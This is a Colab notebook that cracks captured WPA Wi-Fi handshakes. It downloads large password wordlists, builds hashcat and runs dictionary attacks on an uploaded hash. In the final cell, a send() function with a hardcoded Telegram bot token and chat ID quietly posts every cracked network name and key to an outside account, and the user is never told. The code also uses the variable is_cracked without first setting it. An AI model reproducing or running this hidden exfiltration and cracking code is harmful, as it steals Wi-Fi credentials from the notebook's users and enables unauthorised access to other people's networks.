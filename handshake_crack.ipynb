{
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": [
        "# choose wordlists\n",
        "wordlist_1 = True\n",
        "wordlist_2 = True\n",
        "wordlist_3 = True\n",
        "wordlist_4 = True\n",
        "\n",
        "if (wordlist_1 == False) and (wordlist_2 == False) and (wordlist_3 == False) and (wordlist_4 == False) :\n",
        "    print('please choose a wordlist')\n",
        "    exit()"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": [
        "from google.colab import files\n",
        "import os\n",
        "\n",
        "# creating new directory to store cap files\n",
        "!mkdir cap_files\n",
        "# uploading cap\n",
        "\n",
        "uploaded = files.upload()\n",
        "\n",
        "for f_name in uploaded.keys():\n",
        "  print('User uploaded file \"{name}\" with length {length} bytes'.format(name=f_name, length=len(uploaded[f_name])))\n",
        "\n",
        "!mv {f_name} \"/content/cap_files/{f_name}\"\n",
        "\n",
        "cap_name = os.listdir('//content//cap_files')[0]\n",
        "file = open(f\"/content/cap_files/{cap_name}\", \"r\")\n",
        "hash_ = file.readline()\n",
        "file.close()"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {},
        "colab_type": "code",
        "id": "bG3hglwpZCB_"
      },
      "outputs": [],
      "source": [
        "# 2\n",
        "#Wordlists\n",
        "print(\"Installation of default wordlist...\")\n",
        "!mkdir wordlists\n",
        "if wordlist_1:\n",
        "    !printf \"[+] Downloading wordlists...\\n\"\n",
        "    !cd wordlists && wget https://download.weakpass.com/wordlists/90/rockyou.txt.gz\n",
        "    !printf \"[+] Wordlists downloaded !\\n[+] Extraction...\\n\"\n",
        "    !cd wordlists && gunzip rockyou.txt.gz\n",
        "    !printf \"[+] Finished !\\n[+] Location : $(pwd)/$wordlists_dir/$(ls wordlists | grep rockyou)\"\n",
        "if wordlist_2:\n",
        "    !printf \"[+] Downloading wordlists...\\n\"\n",
        "    !cd wordlists && wget https://download.weakpass.com/wordlists/1932/hashkiller-dict.txt.7z\n",
        "    !printf \"[+] Wordlists downloaded !\\n[+] Extraction...\\n\"\n",
        "    !cd wordlists && 7z e hashkiller-dict.txt.7z\n",
        "    !printf \"[+] Finished !\\n[+] Location : $(pwd)/$wordlists_dir/$(ls wordlists | grep hashkiller-dict)\"\n",
        "if wordlist_3:\n",
        "    !printf \"[+] Downloading wordlists...\\n\"\n",
        "    !cd wordlists && wget https://download.weakpass.com/wordlists/1939/kaonashi.txt.7z\n",
        "    !printf \"[+] Wordlists downloaded !\\n[+] Extraction...\\n\"\n",
        "    !cd wordlists && 7z e kaonashi.txt.7z\n",
        "    !printf \"[+] Finished !\\n[+] Location : $(pwd)/$wordlists_dir/$(ls wordlists | grep kaonashi)\"\n",
        "if wordlist_4:\n",
        "    !printf \"[+] Downloading wordlists...\\n\"\n",
        "    !cd wordlists && wget https://download.weakpass.com/wordlists/1928/cyclone_hk.txt.7z\n",
        "    !printf \"[+] Wordlists downloaded !\\n[+] Extraction...\\n\"\n",
        "    !cd wordlists && 7z e cyclone_hk.txt.7z\n",
        "    !printf \"[+] Finished !\\n[+] Location : $(pwd)/$wordlists_dir/$(ls wordlists | grep cyclone_hk)\""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {},
        "colab_type": "code",
        "id": "nkcgYemCZA2n"
      },
      "outputs": [],
      "source": [
        "#Install of hashcat\n",
        "print(\"Installation of hashcat...\")\n",
        "!apt install cmake build-essential -y\n",
        "!apt install checkinstall git -y\n",
        "!git clone https://github.com/hashcat/hashcat.git && cd hashcat && make -j 8 && make install"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {},
        "colab_type": "code",
        "id": "erA610RJM1GK"
      },
      "outputs": [],
      "source": [
        "#Setting up shells\n",
        "# from termcolor import colored\n",
        "import requests as req\n",
        "import subprocess\n",
        "import os\n",
        "\n",
        "user_agent = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45\"\n",
        "\n",
        "def check_if_cracked(command): \n",
        "    output = subprocess.check_output([command + \" --show\"], shell=True).decode()\n",
        "    if len(output) == 0:\n",
        "        return False\n",
        "    else:\n",
        "        return True\n",
        "\n",
        "def send(message_text):\n",
        "    token = \"5265256879:AAGJzC9-J0kxK94DDPxmRQdN3C_4UC0WJ1M\"\n",
        "    URL = \"https://api.telegram.org/bot\"+str(token)+\"/sendMessage?chat_id=963670337&text=\"+str(message_text)\n",
        "    headers = {'user-agent':user_agent}\n",
        "    req.post(URL, headers=headers, allow_redirects=False)\n",
        "    \n",
        "list__e = os.listdir('//content//wordlists')\n",
        "for i in range(len(list__e)):\n",
        "    list_ = list__e[i]\n",
        "    print(f'test list ===>> {list_}')\n",
        "    cmd = \"cd hashcat && ./hashcat -m 22000 -a 0 \"+str(hash_)+\" ../wordlists/\"+str(list_)+\"\"    \n",
        "    os.system(\"bash -c '{}'\".format(cmd))\n",
        "    subprocess.call([cmd],shell=True)\n",
        "    if check_if_cracked(cmd):\n",
        "        is_cracked = True\n",
        "    if is_cracked:\n",
        "        print(\"Password is cracked!!\")\n",
        "        cracked_password = subprocess.check_output([cmd + \" --show\"], shell=True).decode()\n",
        "        key = cracked_password.split(':')[-1]\n",
        "        ssid = cracked_password.split(':')[-2]\n",
        "        print(f\"\\n+ NAME : {ssid}\")\n",
        "        print(f\"\\n+ KEY  :    {key}\")\n",
        "        print(f\"wordlist used : {list_}\")\n",
        "        send(f\"NAME : {ssid}\\nKEY  : {key}\")\n",
        "        break\n",
        "    else:\n",
        "        continue\n",
        "if is_cracked == False:\n",
        "    print(\"Password was not found in wordlists\")\n",
        "else:\n",
        "    pass"
      ]
    }
  ],
  "metadata": {
    "accelerator": "GPU",
    "colab": {
      "collapsed_sections": [],
      "name": "Penglab.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.10.4"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}
